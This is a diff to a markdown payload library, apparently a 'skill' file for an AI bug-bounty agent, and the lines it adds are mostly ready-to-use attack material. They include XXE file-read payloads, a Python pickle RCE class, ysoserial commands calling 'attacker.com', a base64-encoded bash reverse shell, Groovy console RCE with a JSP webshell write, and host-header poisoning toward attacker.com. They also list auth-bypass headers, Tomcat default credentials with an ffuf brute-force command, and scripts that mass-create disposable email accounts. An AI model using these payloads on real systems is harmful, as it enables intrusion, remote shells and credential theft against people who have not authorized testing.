@@ -1,12 +1,57 @@
 ---
 name: security-arsenal
-description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversa...
+description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, conditionally-valid-with-chain table, temp email creation scripts, XXE/deserialization/host header injection payloads. Use when you need specific pa...
 category: api
 ---
 
 # SECURITY ARSENAL
 
-Payloads, bypass tables, wordlists, and submission rules.
+Payloads, bypass tables, wordlists, temp email setup, and submission rules.
+
+---
+
+## TEMP EMAIL SETUP (For Multi-Account Testing)
+
+```bash
+# Mail.tm API (free, no registration, fully programmatic)
+create_temp_email() {
+  DOMAIN=$(curl -s https://api.mail.tm/domains | jq -r '.[0].domain')
+  EMAIL="hunter_$(date +%s)@${DOMAIN}"
+  PASSWORD="TempPass123!"
+  curl -s -X POST https://api.mail.tm/accounts \
+    -H "Content-Type: application/json" \
+    -d "{\"address\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" | jq .
+  echo "$EMAIL" > /tmp/current_temp_email.txt
+}
+
+# Fetch inbox (for password reset tokens, verification links)
+fetch_temp_email() {
+  TOKEN=$(curl -s -X POST https://api.mail.tm/token \
+    -H "Content-Type: application/json" \
+    -d "{\"address\":\"$(cat /tmp/current_temp_email.txt)\",\"password\":\"TempPass123!\"}" | jq -r '.token')
+  curl -s "https://api.mail.tm/messages" \
+    -H "Authorization: Bearer $TOKEN" | jq '.[]'
+}
+
+# Guerrilla Mail (alternative, web-based)
+# Visit: https://www.guerrillamail.com/
+# Or use API: curl -s "https://api.guerrillamail.com/ajax.php?f=get_email_address"
+
+# Yopmail (persistent inboxes — good for long sessions)
+# Visit: https://www.yopmail.com/
+# Inbox: https://www.yopmail.com/en/inbox?mail=YOUR_EMAIL
+```
+
+### Multi-Account Workflow
+
+```bash
+# Create 3 accounts for IDOR/privilege testing
+for i in 1 2 3; do
+  create_temp_email
+  echo "Account $i created. Register on target, then proceed."
+  sleep 2
+done
+```
 
 ---
 
@@ -18,8 +63,9 @@ Payloads, bypass tables, wordlists, and submission rules.
 <img src=x onerror=alert(document.domain)>
 <svg onload=alert(document.domain)>
 "><script>alert(1)</script>
-'><img src=x onerror=alert(1)>
+'"><img src=x onerror=alert(1)>
 javascript:alert(document.domain)
+'-prompt.call(window,%20'xss_found")-
 ```
 
 ### Cookie Theft (proof of impact)
@@ -174,7 +220,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 
 ---
 
-## XXE PAYLOADS
+## XXE PAYLOADS (Expanded)
 
 ### Classic File Read
 ```xml
@@ -204,6 +250,173 @@ SeLeCt * FrOm uSeRs                -- case variation
 ### XXE via DOCX/SVG/PDF Upload
 - SVG: `<image href="file:///etc/passwd" />`
 - DOCX: malicious XML in `word/document.xml` with external entity
+
+### Parameter Entity (Bypass Filters)
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY test "%xxe;">
+]>
+<foo>&test;</foo>
+```
+
+### XXE via Content-Type Switch
+```bash
+# Force XML parsing even on JSON endpoints
+curl -s -X POST https://target.com/api/endpoint \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+```
+
+### XXE in SVG Upload
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="0" y="20">&xxe;</text>
+</svg>
+```
+
+### XXE Bypass Techniques
+```xml
+<!-- SYSTEM keyword blocked? Try PUBLIC -->
+<!DOCTYPE foo [<!ENTITY xxe PUBLIC "random" "file:///etc/passwd">]>
+
+<!-- file:// blocked? Try PHP filter -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+
+<!-- Expect protocol (PHP) -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+
+<!-- Data URI -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SSBhbSBhIHRlc3Q=">]>
+```
+
+---
+
+## INSECURE DESERIALIZATION PAYLOADS
+
+### Python Pickle RCE
+```python
+import pickle, os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+payload = pickle.dumps(Exploit())
+# Send as cookie or POST body
+```
+
+### Java (ysoserial)
+```bash
+# Generate payload
+java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" > payload.bin
+
+# Common gadget chains
+java -jar ysoserial.jar CommonsCollections1 "id"
+java -jar ysoserial.jar Spring1 "id"
+java -jar ysoserial.jar Groovy1 "id"
+```
+
+### PHP (phpggc)
+```bash
+# Laravel RCE
+phpggc Laravel/RCE1 system 'id'
+phpggc Laravel/RCE2 system 'id'
+
+# Symfony RCE
+phpggc Symfony/RCE1 system 'id'
+
+# Monolog RCE
+phpggc Monolog/RCE1 system 'id'
+```
+
+### PHP Serialized Data (Manual)
+```php
+// Example serialized payload
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+// Modify: s:4:"role";s:5:"admin"; → s:4:"role";s:13:"superadmin";
+```
+
+### Detection Patterns
+```
+PHP: O:8:"ClassName":... (serialized objects)
+Java: AC ED 00 05 (serialization magic bytes)
+Python: \x80\x04\x95 (pickle protocol 4)
+Ruby: \x04\x08 (Marshal format)
+YAML: !ruby/object:ClassName (YAML object tags)
+```
+
+---
+
+## HOST HEADER INJECTION PAYLOADS
+
+### Password Reset Poisoning
+```bash
+# Basic test
+curl -s -H "Host: attacker.com" https://target.com/forgot-password
+# Check if reset link uses attacker.com
+
+# With X-Forwarded-Host
+curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/forgot-password
+
+# Header variants to test
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+X-Forwarded-Server: attacker.com
+X-HTTP-Host-Override: attacker.com
+Forwarded: host=attacker.com
+```
+
+### Cache Poisoning via Host
+```bash
+# If cache uses Host as key
+curl -s -H "Host: attacker.com" https://target.com/
+# Then request normal URL — if cached response from attacker.com is served
+```
+
+---
+
+## CUSTOM HEADER INJECTION PAYLOADS
+
+### IP Spoofing (Bypass IP Restrictions)
+```bash
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1, 10.0.0.1 (chain)
+```
+
+### Path Override (Bypass Access Control)
+```bash
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+### Auth Bypass Headers
+```bash
+X-Forwarded-User: admin
+X-Authenticated-User: admin
+X-Remote-User: admin
+X-Admin: true
+X-API-Key: admin
+X-Debug: true
+```
+
+### Method Override
+```bash
+X-HTTP-Method-Override: DELETE
+X-Method-Override: DELETE
+_method: DELETE (in POST body)
+```
+
+### CRLF Injection via Headers
+```bash
+X-Injected-Header: %0d%0aSet-Cookie:%20admin=true
+X-Custom: %0d%0aX-Injected:%20yes
+```
 
 ---
 
@@ -272,6 +485,69 @@ token = f"{header}.{payload}."
 
 # Secret bruteforce
 hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
+```
+
+### JWT Realm Manipulation
+```bash
+# Decode JWT and identify realm parameter
+# Original: "realm":"test-user"
+# Manipulated: "realm":"test-dashboard"
+
+# Common realm values to try
+test-user
+test-dashboard
+admin
+staff
+internal
+management
+superuser
+dashboard
+panel
+
+# Steps:
+# 1. Login to regular account
+# 2. Intercept login POST request
+# 3. Change realm value in JSON body
+# 4. Use new JWT with manipulated realm
+```
+
+### Bearer Token Bypass
+```bash
+# Normal request
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
+
+# Bypass - remove "Bearer" prefix
+Authorization: eyJhbGciOiJIUzI1NiIs...
+
+# Also try
+authorization: Bearer eyJhbGciOiJIUzI1NiIs...  # lowercase
+X-Auth-Token: eyJhbGciOiJIUzI1NiIs...            # different header
+Token: eyJhbGciOiJIUzI1NiIs...                    # alternate format
+```
+
+### S3 Arbitrary File Overwrite
+```bash
+# File upload with destination parameter
+POST /upload HTTP/1.1
+Host: admin.target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+Authorization: <JWT>
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="destination"
+gallery/
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="poc.txt"
+Content-Type: Text/plain
+Arbitrary File Overwrite
+------WebKitFormBoundary--
+
+# Overwrite existing files on CloudFront
+# Change destination to point to existing file path
+# Test: can you overwrite JS, HTML, EXE, PDF files?
+
+# Detection
+ffuf -u https://admin.target.com/FUZZ -X POST -w wordlist.txt -mc 200,201,403 -ac
 ```
 
 ### OAuth Attacks
@@ -711,6 +987,163 @@ cat saml.xml | base64 -w0  # Re-encode
 
 ---
 
+## JAVA-SPECIFIC ATTACK PAYLOADS
+
+### Path Traversal to WEB-INF
+```bash
+# Limited path traversal (Java web apps)
+/admin/download?filename=/WEB-INF/web.xml
+/admin/download?filename=/WEB-INF/classes/config.properties
+/admin/download?filename=/WEB-INF/spring-config.xml
+
+# Bypass filters with encoding
+/admin/download?filename=..%2F..%2FWEB-INF%2Fweb.xml
+/admin/download?filename=%2e%2e%2fWEB-INF%2fweb.xml
+/admin/download?filename=....//....//WEB-INF/web.xml
+```
+
+### WEB-INF Discovery Wordlist
+```bash
+# High-value files to read via path traversal
+/WEB-INF/web.xml                    # Servlet mappings, security constraints
+/WEB-INF/classes/config.properties  # Database creds, API keys
+/WEB-INF/spring-config.xml          # Spring beans, security config
+/WEB-INF/applicationContext.xml     # Application configuration
+/WEB-INF/struts-config.xml          # Struts configuration
+/WEB-INF/beans.xml                  # CDI configuration
+/META-INF/MANIFEST.MF               # Version info, classpath
+/META-INF/context.xml               # Tomcat context configuration
+```
+
+### Groovy Console RCE Payloads
+```groovy
+// Command execution with output
+"id".execute().text
+"sudo cat /etc/passwd".execute().text
+"whoami".execute().text
+
+// Read files
+new File("/etc/passwd").text
+new File("/WEB-INF/web.xml").text
+
+// Reverse shell (Base64 encoded)
+"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}".execute()
+
+// Network scan
+"curl http://169.254.169.254/latest/meta-data/".execute().text
+
+// Write webshell
+new File("/var/www/html/shell.jsp").text = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
+```
+
+### JSF ViewState Attacks
+```bash
+# JSF ViewState is encrypted but may have weak keys
+# Default key: "ViewState"
+
+# Test for ViewState manipulation
+# Capture javax.faces.ViewState cookie/parameter
+# Decode and check for predictable patterns
+
+# ViewState decryption tool (if key known)
+java -jar jsfv ViewState --key ViewState --decrypt < encrypted_viewstate
+```
+
+### Java Deserialization Detection
+```bash
+# Look for serialized objects in HTTP traffic
+# Magic bytes: AC ED 00 05
+
+# Cookie names to check
+JSESSIONID
+SESSION
+javax.faces.ViewState
+org.springframework.web.servlet.HandlerMapping
+
+# Decode Base64 serialized objects
+echo "rO0AB..." | base64 -d | xxd | head -5
+# If starts with AC ED 00 05 = Java serialization
+```
+
+### ysoserial Payloads
+```bash
+# Common gadget chains
+java -jar ysoserial.jar CommonsCollections1 "id"
+java -jar ysoserial.jar CommonsCollections2 "id"
+java -jar ysoserial.jar CommonsCollections3 "id"
+java -jar ysoserial.jar CommonsCollections4 "id"
+java -jar ysoserial.jar CommonsCollections5 "id"
+java -jar ysoserial.jar Spring1 "id"
+java -jar ysoserial.jar Spring2 "id"
+java -jar ysoserial.jar Groovy1 "id"
+java -jar ysoserial.jar Hibernate1 "id"
+java -jar ysoserial.jar Jdk7u21 "id"
+
+# Reverse shell payload
+java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"
+```
+
+### Java Log File Analysis
+```bash
+# Download real-time logs
+/admin/incident-report        # Returns .zip file
+/admin/logs                   # Direct log viewer
+
+# Extract credentials from logs
+unzip incident-report.zip
+grep -i "password\|passwd\|pwd" *.log
+grep -i "session\|token\|auth" *.log
+grep -i "admin\|root\|superuser" *.log
+
+# Look for MD5 hashes (common in Java apps)
+grep -oP '[a-f0-9]{32}' *.log
+
+# Decode MD5 hashes
+echo -n "21232f297a57a5a743894a0e4a801fc3" | md5sum
+# Result: admin (MD5 of "admin")
+```
+
+### Spring Boot Actuator Endpoints
+```bash
+# Common actuator paths
+/actuator
+/actuator/env          # Environment variables (may contain secrets)
+/actuator/heapdump     # Memory dump (contains credentials)
+/actuator/configprops  # Configuration properties
+/actuator/mappings     # All endpoint mappings
+/actuator/beans        # All beans
+/actuator/info         # Application info
+
+# Heapdump analysis
+# Download heapdump and search for passwords
+strings heapdump | grep -i "password\|secret\|key"
+```
+
+### Tomcat Manager Brute Force
+```bash
+# Default credentials
+admin:admin
+admin:password
+admin:tomcat
+tomcat:tomcat
+tomcat:password
+admin:s3cret
+both:tomcat
+manager:manager
+root:root
+root:password
+
+# Brute force with ffuf
+ffuf -u https://target.com/manager/html -X POST \
+  -d "j_username=FUZZ1&j_password=FUZZ2" \
+  -w <(echo "admin:admin
+admin:password
+tomcat:tomcat
+admin:tomcat") -fc 401
+```
+
+---
+
 ## GF PATTERN NAMES (tomnomnom/gf)
 
 ```bash
@@ -837,76 +1270,3 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 /v1
 /v2
 ```
-
----
-
-## Related Skills & Chains
-
-- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** — When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.
-- **`triage-validation`** — When deciding if a finding is reportable at all. Workflow primitive: the "Always Rejected" and "Conditionally Valid — Requires Chain" tables in both skills must agree; `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used by Q7.
-- **`web2-recon`** — When the URL set has been classified by `gf` patterns. Workflow primitive: `gf xss/ssrf/sqli` outputs from recon → look up the corresponding payload section here; `gf` pattern names index directly into this skill's payload sections.
-- **`evidence-hygiene`** — When a payload produces output worth screenshotting. Workflow primitive: after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for redaction before the screenshot becomes evidence.
-- **`bb-methodology`** — When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase 3's decision flow ("ID param → IDOR checklist", "URL input → SSRF checklist") names which section of this arsenal to load.
-
----
-
-## Operator Notes (Claude-BugHunter)
-
-> Engagement-derived + 2026-specific additions to the vendored foundation.
-> Wisdom from real authorized engagements + Phase 2 verification across
-> this repo's 31+ skill-area live tests. The upstream payload library
-> covers the WHAT; this layer covers the WHEN-IT-WORKS-vs-WHEN-IT-DOESN'T.
-
-### Payload freshness — what's gone stale by 2026
-
-The classic CL.TE / TE.CL HTTP smuggling payloads no longer work against Nginx ≥ 1.21, Caddy 2.x, Envoy ≥ 1.20 (verified in Phase 2H). They DO still work against HAProxy ≤ 2.4, older F5 BIG-IP, Citrix ADC, AWS ALB-specific configs, and Apache Traffic Server. Fingerprint the front-end first — `curl -sI` → `Server:` header + `Via:` chain + TLS JA3 — before burning hours on payloads that the parser already rejects at the front door.
-
-Same story for XXE classic — Python lxml ≥ 5.x silently drops SYSTEM entities by default (Phase 2G finding). The payloads remain valid against: Java SAX, PHP DOMDocument with LIBXML_NOENT, .NET XmlDocument with XmlResolver still wired, older lxml (< 5.0), Ruby Nokogiri with DTDLOAD, and a long tail of embedded XML processors (SOAP libraries, SAML implementations, Office document parsers). The payload library still ships these — the operator decision is whether the target's parser is in the still-vulnerable set.
-
-Other stale-by-default-but-not-everywhere payloads as of 2026: `javascript:` URLs in `<a href>` (Chrome blocks unless explicit user gesture; works in embedded WebViews, Electron, older Edge); `data:text/html` for top-level navigation (modern browsers strip in nav contexts); CRLF injection in `Location:` (most reverse proxies normalize). Always test in the actual target environment, not in a generic browser.
-
-### WAF evaluation order matters
-
-When multiple bypass payloads exist for the same WAF, the order to try is:
-
-1. **Encoding tricks** — case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.
-2. **Parser quirks** — XML namespace, JSON `\u` escapes mid-keyword, `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion, multipart boundary tricks.
-3. **Protocol-level** — HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection, `X-Original-URL`, `X-Forwarded-*` smuggling.
-4. **WAF rule-specific bypasses** — Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known signature gaps; load the vendor-specific payload subsection.
-
-Most engagements end at step 2 — modern WAFs trip on the parser-quirk class because the WAF and the origin app disagree on what's a "valid" request.
-
-### OOB-Or-It-Didn't-Happen Gate applies everywhere
-
-Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab proved the gate kills FPs that look identical to real bugs at the surface — error messages with `you have an error in your SQL syntax` text in a 500 page can be parser logs from a different request entirely, hit a Burp Collaborator domain (or interactsh) and confirm callback before filing.
-
-OOB callback infrastructure ranking by 2026: (1) Burp Collaborator (Pro license; cleanest), (2) interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party — never use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for long-running engagements).
-
-### Marker discipline
-
-Generic words appear naturally in target content. A search for `javascript` hitting "JavaScript Tutorial" is not reflection — it's keyword overlap. Use unique random strings:
-
-```
-m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
-# now m is like "K7gXq2pNRm1z" — search for THIS in the response
-curl "https://target/search?q=${m}" | grep -c "$m"
-```
-
-If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth — generic keywords lie.
-
-### Statistical Sampling for noisy oracles
-
-Single-trial timing differentials are noise. Require n≥10 interleaved trials, Welch's t-statistic > 3, or equivalent confidence-interval separation. Phase 2D verified this against a deliberately-noisy timing oracle: single trial showed 129ms delta (which would have been filed); n=10 showed mean 78ms vs 191ms with t=5.26 (real, well-supported).
-
-Skeleton for timing-side-channel validation:
-
-```python
-import statistics
-def welch_t(a, b):
-    ma, mb = statistics.mean(a), statistics.mean(b)
-    va, vb = statistics.variance(a), statistics.variance(b)
-    return (ma - mb) / ((va/len(a) + vb/len(b)) ** 0.5)
-# interleave control + test trials, n=10 each, t > 3 = signal
-```
-
-Same rule applies to blind boolean oracles where the diff is response-length or status-code under jitter — sample, don't assume.
